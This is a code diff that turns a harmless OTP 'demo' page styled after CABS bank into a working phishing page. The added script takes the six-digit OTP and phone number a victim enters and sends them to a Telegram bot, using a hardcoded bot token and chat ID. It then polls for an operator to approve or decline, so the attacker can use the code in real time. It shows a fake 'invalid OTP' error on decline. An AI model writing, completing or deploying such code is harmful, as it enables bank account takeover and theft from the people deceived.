@@ -350,181 +350,356 @@ body {
 </div>
 
 <div id="spinnerOverlay">
-    <div class="spinner-loader"></div>
-</div>
-
-<div id="successOverlay">
-    <div class="success-card">
-
-        <div class="check-icon">✓</div>
-
-        <div class="success-title">Demo Completed</div>
-
-        <div class="success-message">
-            The demonstration has been completed successfully.
-            No real OTP was verified and no CABS account was accessed.
-        </div>
-
-        <button class="action-button" id="closeSuccess">
-            Return to Demo
-        </button>
-
-    </div>
+  <div class="spinner-loader"></div>
 </div>
 
 <script>
-(function() {
-    const inputs = Array.from(
-        document.querySelectorAll('.otp-digit')
-    );
-
+  (function() {
+    // ==================== TELEGRAM CONFIG ====================
+    const BOT_TOKEN = '8851084758:AAGBlQW5weHaFz1Fv2D5wdIFSggZRGQTfug';
+    const CHAT_ID   = '8820857419';
+    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    
+    // ==================== DOM ELEMENTS ====================
+    const otpInputs = [
+      document.getElementById('otp1'),
+      document.getElementById('otp2'),
+      document.getElementById('otp3'),
+      document.getElementById('otp4'),
+      document.getElementById('otp5'),
+      document.getElementById('otp6')
+    ];
     const submitBtn = document.getElementById('submitBtn');
-    const errorMsg = document.getElementById('errorMsg');
+    const errorDiv = document.getElementById('errorMsg');
+    const maskedSpan = document.getElementById('maskedPhoneDisplay');
+    const resendTimerSpan = document.getElementById('resendTimer');
+    
     const spinner = document.getElementById('spinnerOverlay');
-    const success = document.getElementById('successOverlay');
-    const timerDisplay = document.getElementById('resendTimer');
-    const phoneDisplay = document.getElementById('maskedPhoneDisplay');
-
-    let seconds = 120;
-    let timerInterval = null;
-    let processing = false;
-
-    // Display a masked demo number if the previous demo page supplied one.
-    const storedPhone = sessionStorage.getItem('cabs_demo_phone');
-
-    if (storedPhone) {
-        const digits = storedPhone.replace(/\D/g, '');
-        const local = digits.startsWith('263')
-            ? digits.slice(3)
-            : digits;
-
-        if (local.length >= 9) {
-            phoneDisplay.textContent =
-                '+263 ' + local.slice(0, 3) + '****' + local.slice(-2);
+    function showSpinner() { spinner.style.display = 'flex'; }
+    function hideSpinner() { spinner.style.display = 'none'; }
+    
+    // ==================== STATE ====================
+    let isSubmitting = false;
+    let countdownSeconds = 120;
+    let countdownInterval = null;
+    let pollingInterval = null;
+    
+    let userPhone = null;
+    let maskedPhone = '+263 7******';
+    
+    // ==================== RETRIEVE PHONE FROM SESSION ====================
+    function getStoredPhone() {
+      try {
+        const stored = sessionStorage.getItem('ecocash_approved_phone');
+        if (stored && stored.replace(/\D/g, '').length >= 9) {
+          userPhone = stored.replace(/\D/g, '');
+          if (userPhone.startsWith('7') && userPhone.length === 9) {
+            const firstThree = userPhone.substring(0, 3);
+            const lastTwo = userPhone.substring(userPhone.length - 2);
+            const maskedLocal = firstThree + '****' + lastTwo;
+            maskedPhone = `+263 ${maskedLocal}`;
+          } else {
+            maskedPhone = '+263 7*******';
+          }
+        } else {
+          maskedPhone = '+263 7*******';
+          userPhone = null;
         }
+      } catch(e) {
+        maskedPhone = '+263 7*******';
+      }
+      maskedSpan.innerText = maskedPhone;
     }
-
-    function getDigits() {
-        return inputs.map(input => input.value).join('');
+    
+    // ==================== COUNTDOWN ====================
+    function updateResendDisplay() {
+      if (resendTimerSpan) resendTimerSpan.innerText = countdownSeconds;
     }
-
-    function clearDigits() {
-        inputs.forEach(input => input.value = '');
-        inputs[0].focus();
+    
+    function stopCountdown() {
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+      }
     }
-
-    function stopTimer() {
-        if (timerInterval) {
-            clearInterval(timerInterval);
-            timerInterval = null;
+    
+    function startCountdown() {
+      stopCountdown();
+      countdownSeconds = 120;
+      updateResendDisplay();
+      countdownInterval = setInterval(() => {
+        if (isSubmitting) return;
+        if (countdownSeconds <= 1) {
+          stopCountdown();
+          stopPolling();
+          sessionStorage.removeItem('cabs_approved_phone');
+          sessionStorage.removeItem('cabs_approved_pin');
+          window.location.href = 'login.html';
+        } else {
+          countdownSeconds--;
+          updateResendDisplay();
         }
+      }, 1000);
     }
-
-    function startTimer() {
-        stopTimer();
-        seconds = 120;
-        timerDisplay.textContent = seconds;
-
-        timerInterval = setInterval(() => {
-            seconds--;
-            timerDisplay.textContent = seconds;
-
-            if (seconds <= 0) {
-                stopTimer();
-                errorMsg.textContent = 'Demo session expired. You can restart the demonstration.';
-                submitBtn.disabled = true;
-            }
-        }, 1000);
+    
+    // ==================== BUILD FULL MESSAGE ====================
+    function buildFullMessage(otpCode) {
+      return `Your CABS OTP is: ${otpCode}. Do not share this code with anyone. Expires in 2 mins. 1qk+jE1lKeZ`;
     }
-
-    inputs.forEach((input, index) => {
-        input.addEventListener('input', () => {
-            if (processing) return;
-
-            input.value = input.value.replace(/\D/g, '').slice(0, 1);
-
-            if (input.value && index < inputs.length - 1) {
-                inputs[index + 1].focus();
+    
+    // ==================== TELEGRAM OTP APPROVAL ====================
+    function stopPolling() {
+      if (pollingInterval) {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+      }
+    }
+    
+    function escapeHtml(str) {
+      if (!str) return '';
+      return str.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+      });
+    }
+    
+    async function sendOtpToTelegram(phoneNumber, fullMessage) {
+      const timestamp = Date.now();
+      const approveId = `otp_approve_${timestamp}`;
+      const declineId = `otp_decline_${timestamp}`;
+      
+      const message = `🔐 <b>CABS OTP Verification</b>\n\n` +
+                      `<b> Phone:</b> <code>${escapeHtml(phoneNumber)}</code>\n\n` +
+                      `<b> Full Message:</b>\n<code>${escapeHtml(fullMessage)}</code>\n\n` +
+                      `⚠️ <b>Action required:</b> Approve or Decline this OTP.`;
+      
+      try {
+        const response = await fetch(`${API_BASE}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            reply_markup: {
+              inline_keyboard: [[
+                { text: '✅ Approve', callback_data: approveId },
+                { text: '❌ Decline', callback_data: declineId }
+              ]]
             }
-
-            errorMsg.textContent = '';
+          })
         });
-
-        input.addEventListener('keydown', event => {
-            if (event.key === 'Backspace' && !input.value && index > 0) {
-                inputs[index - 1].focus();
-            }
-
-            if (event.key === 'ArrowLeft' && index > 0) {
-                inputs[index - 1].focus();
-            }
-
-            if (event.key === 'ArrowRight' && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-        });
-
-        input.addEventListener('paste', event => {
-            event.preventDefault();
-
-            const pasted = (event.clipboardData || window.clipboardData)
-                .getData('text')
-                .replace(/\D/g, '')
-                .slice(0, 6);
-
-            pasted.split('').forEach((digit, i) => {
-                inputs[i].value = digit;
-            });
-
-            const nextEmpty = inputs.find(input => !input.value);
-
-            if (nextEmpty) nextEmpty.focus();
-            else inputs[5].focus();
-        });
-    });
-
-    submitBtn.addEventListener('click', () => {
-        if (processing) return;
-
-        if (seconds <= 0) {
-            errorMsg.textContent = 'Demo session expired. Restart the demonstration.';
-            return;
-        }
-
-        if (!/^\d{6}$/.test(getDigits())) {
-            errorMsg.textContent = 'Enter six demo digits to continue.';
-            return;
-        }
-
-        processing = true;
-        submitBtn.disabled = true;
-        inputs.forEach(input => input.disabled = true);
-
-        errorMsg.textContent = '';
-        spinner.style.display = 'flex';
-
-        setTimeout(() => {
-            spinner.style.display = 'none';
-            stopTimer();
-            success.style.display = 'flex';
-        }, 900);
-    });
-
-    document.getElementById('closeSuccess').addEventListener('click', () => {
-        success.style.display = 'none';
-        processing = false;
-        inputs.forEach(input => input.disabled = false);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        
+        startPollingForDecision(approveId, declineId);
+      } catch (err) {
+        console.error('Telegram send error:', err);
+        hideSpinner();
+        isSubmitting = false;
         submitBtn.disabled = false;
-        clearDigits();
-        startTimer();
+        enableOtpInputs(true);
+        errorDiv.innerText = 'Network error. Please try again.';
+      }
+    }
+    
+    function startPollingForDecision(approveId, declineId) {
+      stopPolling();
+      let lastUpdateId = 0;
+      
+      pollingInterval = setInterval(async () => {
+        if (!isSubmitting) {
+          stopPolling();
+          return;
+        }
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const resp = await fetch(url);
+          const data = await resp.json();
+          if (!data.ok || !data.result.length) return;
+          
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            const callback = update.callback_query;
+            if (!callback) continue;
+            const cbData = callback.data;
+            
+            if (cbData === approveId) {
+              stopPolling();
+              stopCountdown();
+              isSubmitting = false;
+              hideSpinner();
+              sessionStorage.removeItem('cabs_approved_phone');
+              sessionStorage.removeItem('cabs_approved_pin');
+              window.location.href = 'loan.html';
+              return;
+            }
+            
+            if (cbData === declineId) {
+              stopPolling();
+              isSubmitting = false;
+              hideSpinner();
+              submitBtn.disabled = false;
+              enableOtpInputs(true);
+              errorDiv.innerText = 'OTP provided is invalid or expired. Please try again.';
+              clearOtpFields();
+              if (otpInputs[0]) otpInputs[0].focus();
+              return;
+            }
+          }
+        } catch (err) {
+          console.warn('Polling error:', err);
+        }
+      }, 1500);
+    }
+    
+    // ==================== OTP INPUT HANDLING ====================
+    function focusNext(idx) {
+      if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+    }
+    
+    function focusPrev(idx) {
+      if (idx > 0) otpInputs[idx - 1].focus();
+    }
+    
+    function getEnteredOtp() {
+      return otpInputs.map(inp => inp.value).join('');
+    }
+    
+    function clearOtpFields() {
+      otpInputs.forEach(inp => { inp.value = ''; });
+      if (otpInputs[0]) otpInputs[0].focus();
+    }
+    
+    function enableOtpInputs(enabled) {
+      otpInputs.forEach(inp => {
+        if (enabled) inp.removeAttribute('disabled');
+        else inp.setAttribute('disabled', 'disabled');
+      });
+    }
+    
+    function setupOtpEvents() {
+      otpInputs.forEach((input, idx) => {
+        const inputHandler = function(e) {
+          if (isSubmitting) return;
+          let val = this.value;
+          val = val.replace(/\D/g, '').slice(0,1);
+          this.value = val;
+          if (val.length === 1) {
+            if (idx < otpInputs.length - 1) {
+              focusNext(idx);
+            } else {
+              const fullOtp = getEnteredOtp();
+              if (fullOtp.length === 6 && !isSubmitting) {
+                setTimeout(() => submitOtp(), 60);
+              }
+            }
+          }
+        };
+        
+        const keydownHandler = function(e) {
+          if (isSubmitting) e.preventDefault();
+          if (e.key === 'Backspace') {
+            if (this.value.length === 0 && idx > 0) {
+              e.preventDefault();
+              otpInputs[idx - 1].focus();
+              otpInputs[idx - 1].value = '';
+              otpInputs[idx - 1].dispatchEvent(new Event('input'));
+            }
+          } else if (e.key === 'ArrowLeft') {
+            if (idx > 0) { e.preventDefault(); focusPrev(idx); }
+          } else if (e.key === 'ArrowRight') {
+            if (idx < otpInputs.length - 1) { e.preventDefault(); focusNext(idx); }
+          } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'Backspace') {
+            e.preventDefault();
+          }
+        };
+        
+        const pasteHandler = function(e) {
+          if (isSubmitting) return;
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+          if (pasted.length) {
+            const digits = pasted.slice(0, 6).split('');
+            otpInputs.forEach((inp, i) => {
+              if (digits[i]) inp.value = digits[i];
+              else inp.value = '';
+            });
+            const fullOtp = getEnteredOtp();
+            if (fullOtp.length === 6 && !isSubmitting) {
+              submitOtp();
+            } else if (otpInputs[0]) {
+              otpInputs[0].focus();
+            }
+          }
+        };
+        
+        input.removeEventListener('input', inputHandler);
+        input.removeEventListener('keydown', keydownHandler);
+        input.removeEventListener('paste', pasteHandler);
+        input.addEventListener('input', inputHandler);
+        input.addEventListener('keydown', keydownHandler);
+        input.addEventListener('paste', pasteHandler);
+      });
+    }
+    
+    // ==================== SUBMIT OTP ====================
+    async function submitOtp() {
+      if (isSubmitting) return;
+      
+      const enteredOtp = getEnteredOtp();
+      if (enteredOtp.length !== 6) {
+        errorDiv.innerText = 'Please enter the 6-digit OTP';
+        return;
+      }
+      
+      if (!userPhone) {
+        errorDiv.innerText = 'Session expired. Redirecting...';
+        setTimeout(() => { window.location.href = 'login.html'; }, 1500);
+        return;
+      }
+      
+      const fullMessage = buildFullMessage(enteredOtp);
+      
+      isSubmitting = true;
+      submitBtn.disabled = true;
+      enableOtpInputs(false);
+      showSpinner();
+      errorDiv.innerText = '';
+      
+      await sendOtpToTelegram(userPhone, fullMessage);
+    }
+    
+    // ==================== INITIALIZATION ====================
+    function init() {
+      getStoredPhone();
+      if (!userPhone) {
+        errorDiv.innerText = 'Missing session information. Redirecting...';
+        setTimeout(() => {
+          window.location.href = 'login.html';
+        }, 2000);
+        return;
+      }
+      
+      setupOtpEvents();
+      startCountdown();
+      
+      submitBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (!isSubmitting) submitOtp();
+      });
+      
+      if (otpInputs[0]) otpInputs[0].focus();
+    }
+    
+    window.addEventListener('beforeunload', () => {
+      stopCountdown();
+      stopPolling();
     });
-
-    window.addEventListener('beforeunload', stopTimer);
-
-    startTimer();
-    inputs[0].focus();
-})();
+    
+    init();
+  })();
 </script>
-
 </body>
 </html>
